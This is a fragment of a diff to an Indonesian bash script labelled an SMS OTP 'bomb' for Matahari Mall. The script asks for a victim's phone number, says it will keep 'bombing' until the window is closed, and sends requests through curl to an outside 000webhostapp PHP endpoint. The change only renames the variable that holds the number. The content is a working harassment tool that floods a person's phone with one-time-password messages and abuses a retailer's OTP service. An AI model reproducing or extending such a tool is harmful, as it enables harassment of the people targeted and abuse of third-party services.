@@ -18,13 +18,13 @@ echo -e $blue"mBom Sms OTP Matahari Mall"
 echo -e $cyan"Coded by Muhammad Fazriansyah"
 echo -e $lightgreen">> input dgn 628xxx>>"
 echo -e $red""
-read -p "Input No HP: " sayang;
+read -p "Input No HP: " anjg;
 echo ""  
 echo -e $yellow"Sedang mencoba Ngebom :)"
 echo -e $okegreen"Selama Ngga di Close bakal Ngebom terus :)"
 echo -e $okegreen""
 echo -e $cyan">>>> Hasil >>>>"
-if [ $sayang]
+if [ $anjg]
 then
 curl "https://sandroewek.000webhostapp.com/mm/r.php"
 
